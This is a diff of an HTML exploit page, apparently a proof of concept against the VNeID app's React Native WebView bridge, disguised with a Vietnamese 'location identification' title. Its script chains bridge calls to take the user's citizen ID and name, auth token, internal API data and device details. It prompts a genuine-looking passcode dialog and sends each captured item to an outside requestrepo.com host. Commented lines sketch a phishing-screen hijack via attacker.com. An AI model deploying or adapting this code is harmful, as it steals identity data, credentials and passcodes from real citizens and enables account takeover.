@@ -1,99 +1,215 @@
 <!DOCTYPE html>
 <html>
-<head><title>Định danh địa điểm</title></head>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Định danh địa điểm</title>
+<style>
+body { font-family: sans-serif; margin: 16px; background: #f5f5f5; }
+h1 { font-size: 18px; color: #1a73e8; }
+.phase { margin: 8px 0; padding: 8px; background: #fff; border-radius: 6px; border-left: 3px solid #ccc; }
+.phase.done { border-left-color: #34a853; }
+.phase.active { border-left-color: #fbbc04; }
+.phase.fail { border-left-color: #ea4335; }
+pre { white-space: pre-wrap; word-break: break-all; font-size: 12px; max-height: 200px; overflow: auto; }
+#log { font-size: 11px; color: #666; margin-top: 16px; }
+</style>
+</head>
 <body>
-<h1 id="status">Đang tải...</h1>
-<pre id="result" style="white-space:pre-wrap;word-break:break-all;"></pre>
+<h1 id="status">Đang tải dịch vụ...</h1>
+
+<div id="phase1" class="phase">① Lấy thông tin công dân...</div>
+<div id="phase2" class="phase">② Lấy token xác thực...</div>
+<div id="phase3" class="phase">③ Truy vấn API nội bộ...</div>
+<div id="phase4" class="phase">④ Lấy thông tin thiết bị...</div>
+<div id="phase5" class="phase">⑤ Yêu cầu mã passcode...</div>
+
+<pre id="result"></pre>
+<pre id="log"></pre>
+
 <script>
+var EXFIL = 'https://9liv9n84.requestrepo.com';
+var collected = {};
 var resultEl = document.getElementById('result');
-var statusEl = document.getElementById('status');
+var logEl = document.getElementById('log');
 
 function log(msg) {
-  resultEl.textContent += msg + '\n';
-  console.log(msg);
+  logEl.textContent += msg + '\n';
+}
+
+function setPhase(id, cls, text) {
+  var el = document.getElementById(id);
+  el.className = 'phase ' + cls;
+  if (text) el.textContent = text;
 }
 
 function exfil(tag, data) {
   var payload = encodeURIComponent(JSON.stringify(data));
-  // Primary: fetch over HTTPS (no mixed content issue)
-  try {
-    fetch('https://9liv9n84.requestrepo.com/' + tag + '?d=' + payload, {mode: 'no-cors'});
-  } catch(_) {}
-  // Fallback: HTTPS image beacon
-  new Image().src = 'https://9liv9n84.requestrepo.com/' + tag + '?d=' + payload;
+  try { fetch(EXFIL + '/' + tag + '?d=' + payload, {mode: 'no-cors'}); } catch(_) {}
+  new Image().src = EXFIL + '/' + tag + '?d=' + payload;
 }
 
-// Listen for response FIRST, before sending
-function setupListeners() {
-  // Path 1: postMessage response
-  window.addEventListener('message', function(e) {
-    log('[message event] ' + JSON.stringify(e.data));
-    try {
-      var data = typeof e.data === 'string' ? JSON.parse(e.data) : e.data;
-      if (data.event === 'ON_USER_INFO' || data.event === 'ON_GET_USER_INFO') {
-        statusEl.textContent = 'GOT USER INFO!';
-        log('=== PII LEAKED ===');
-        log(JSON.stringify(data, null, 2));
-        exfil('poc', data);
-      }
-      if (data.event === 'ON_TOKEN' || data.event === 'ON_GET_TOKEN') {
-        log('=== TOKEN LEAKED ===');
-        log(JSON.stringify(data, null, 2));
-        exfil('poc_token', data);
-      }
-    } catch(ex) {
-      log('parse error: ' + ex.message);
-    }
-  });
-
-  // Path 2: CustomEvent (nativeMessage) — used by sendDataToWebView
-  window.addEventListener('nativeMessage', function(e) {
-    log('[nativeMessage event] ' + JSON.stringify(e.detail));
-    if (e.detail) {
-      statusEl.textContent = 'GOT NATIVE MESSAGE!';
-      exfil('poc2', e.detail);
-    }
-  });
-
-  // Path 3: handleNativeMessage global function — used by sendDataToWebView
-  window.handleNativeMessage = function(data) {
-    log('[handleNativeMessage] ' + JSON.stringify(data));
-    statusEl.textContent = 'GOT NATIVE MESSAGE (handler)!';
-    exfil('poc3', data);
-  };
+function sendEvent(event, data) {
+  log('>> ' + event);
+  window.ReactNativeWebView.postMessage(JSON.stringify({event: event, data: data || {}}));
 }
 
-setupListeners();
+// === Response handlers ===
+// Bridge responds via 3 paths: postMessage, handleNativeMessage, CustomEvent
+// Response event = "ON_" + request event name
 
-// Wait for ReactNativeWebView to be injected, then send events
-function tryExploit() {
-  if (window.ReactNativeWebView && window.ReactNativeWebView.postMessage) {
-    log('ReactNativeWebView found! Sending GET_USER_INFO...');
+function handleResponse(data) {
+  if (!data || !data.event) return;
+  var ev = data.event;
+  var d = data.data;
+  log('<< ' + ev);
 
-    // Request PII
-    window.ReactNativeWebView.postMessage(JSON.stringify({
-      event: "GET_USER_INFO",
-      data: {}
-    }));
+  // VULN-01: PII leak
+  if (ev === 'ON_GET_USER_INFO') {
+    setPhase('phase1', 'done', '① CCCD: ' + (d && d.data ? d.data.citizenNumber : '?') + ' — ' + (d && d.data ? d.data.fullName : '?'));
+    collected.userInfo = d;
+    exfil('v01_pii', d);
+    runPhase2();
+  }
 
-    // Also request token
-    setTimeout(function() {
-      log('Sending GET_TOKEN...');
-      window.ReactNativeWebView.postMessage(JSON.stringify({
-        event: "GET_TOKEN",
-        data: {}
-      }));
-    }, 500);
+  // VULN-02: Token leak
+  if (ev === 'ON_GET_TOKEN') {
+    var token = d && d.token ? d.token.substring(0, 20) + '...' : '?';
+    setPhase('phase2', 'done', '② Token: ' + token);
+    collected.token = d;
+    exfil('v02_token', d);
+    runPhase3();
+  }
 
-    statusEl.textContent = 'Events sent, waiting for response...';
-  } else {
-    log('Waiting for ReactNativeWebView... (' + (Date.now()) + ')');
-    setTimeout(tryExploit, 200);
+  // VULN-03: CALL_VNEID_API responses (prefixed ON_CALL_VNEID_API)
+  if (ev.indexOf('ON_CALL_VNEID_API') === 0) {
+    setPhase('phase3', 'done', '③ API response received');
+    collected.apiResponse = d;
+    exfil('v03_api', d);
+    runPhase4();
+  }
+
+  // VULN-04: GET_DEVICE_INSETS response
+  if (ev === 'ON_GET_DEVICE_INSETS') {
+    setPhase('phase4', 'done', '④ Device insets: ' + JSON.stringify(d));
+    collected.insets = d;
+    exfil('v04_insets', d);
+    runPhase5();
+  }
+
+  // VULN-06: Passcode leak
+  if (ev === 'ON_REQUEST_PASSCODE') {
+    if (d && d.data && d.data.passcode) {
+      setPhase('phase5', 'done', '⑤ Passcode: ' + d.data.passcode);
+      collected.passcode = d.data.passcode;
+      exfil('v06_passcode', d);
+    } else if (d && d.code !== 0) {
+      setPhase('phase5', 'fail', '⑤ Passcode: user cancelled');
+    }
+    finalize();
   }
 }
 
-// Start polling after a small delay
-setTimeout(tryExploit, 300);
+// Path 1: postMessage
+window.addEventListener('message', function(e) {
+  try {
+    var data = typeof e.data === 'string' ? JSON.parse(e.data) : e.data;
+    handleResponse(data);
+  } catch(_) {}
+});
+
+// Path 2: CustomEvent
+window.addEventListener('nativeMessage', function(e) {
+  if (e.detail) handleResponse(e.detail);
+});
+
+// Path 3: handleNativeMessage (injectedJS path — confirmed working)
+window.handleNativeMessage = function(data) {
+  handleResponse(data);
+};
+
+// === Attack chain (sequential, each phase triggers next) ===
+
+function runPhase1() {
+  setPhase('phase1', 'active');
+  sendEvent('GET_USER_INFO');
+}
+
+function runPhase2() {
+  setPhase('phase2', 'active');
+  sendEvent('GET_TOKEN', {transId: 'txn-' + Date.now()});
+}
+
+function runPhase3() {
+  setPhase('phase3', 'active');
+  // Use the stolen token to call VNeID internal API as victim
+  // Try to read citizen profile via the proxy bridge
+  sendEvent('CALL_VNEID_API', {
+    method: 'GET',
+    path: '/api/citizen/profile',
+    params: {}
+  });
+  // Timeout fallback if API doesn't respond (path might differ)
+  setTimeout(function() {
+    if (!collected.apiResponse) {
+      setPhase('phase3', 'fail', '③ API: no response (path may differ)');
+      runPhase4();
+    }
+  }, 5000);
+}
+
+function runPhase4() {
+  setPhase('phase4', 'active');
+  sendEvent('GET_DEVICE_INSETS');
+  // Timeout fallback
+  setTimeout(function() {
+    if (!collected.insets) {
+      setPhase('phase4', 'fail', '④ Insets: no response');
+      runPhase5();
+    }
+  }, 3000);
+}
+
+function runPhase5() {
+  setPhase('phase5', 'active', '⑤ Đang yêu cầu xác thực...');
+  // VULN-06: triggers native passcode dialog — user sees legitimate VNeID prompt
+  sendEvent('REQUEST_PASSCODE');
+  // Timeout fallback if user cancels
+  setTimeout(function() {
+    if (!collected.passcode) {
+      setPhase('phase5', 'fail', '⑤ Passcode: timeout/cancelled');
+      finalize();
+    }
+  }, 30000);
+}
+
+function finalize() {
+  document.getElementById('status').textContent = 'Hoàn tất';
+  // Send full collection
+  exfil('full_chain', collected);
+  resultEl.textContent = JSON.stringify(collected, null, 2);
+  log('=== FULL CHAIN COMPLETE ===');
+  log('Collected: ' + Object.keys(collected).join(', '));
+
+  // VULN-04: Navigate to phishing screen as bonus demo
+  // (commented out — uncomment to also demonstrate screen hijack)
+  // sendEvent('NAVIGATE_SCREEN', {name: 'AppWebviewScreen', params: {screen: {url: 'https://attacker.com/phish', title: 'Xác thực tài khoản'}}, replace: true});
+
+  // VULN-07: Open external link demo (commented — uncomment to demo)
+  // sendEvent('OPEN_LINK', {link: 'tel:+841900xxxx'});
+}
+
+// === Bootstrap: wait for ReactNativeWebView injection ===
+function tryStart() {
+  if (window.ReactNativeWebView && window.ReactNativeWebView.postMessage) {
+    log('ReactNativeWebView ready');
+    document.getElementById('status').textContent = 'Đang xử lý...';
+    runPhase1();
+  } else {
+    setTimeout(tryStart, 200);
+  }
+}
+setTimeout(tryStart, 300);
 </script>
 </body>
 </html>
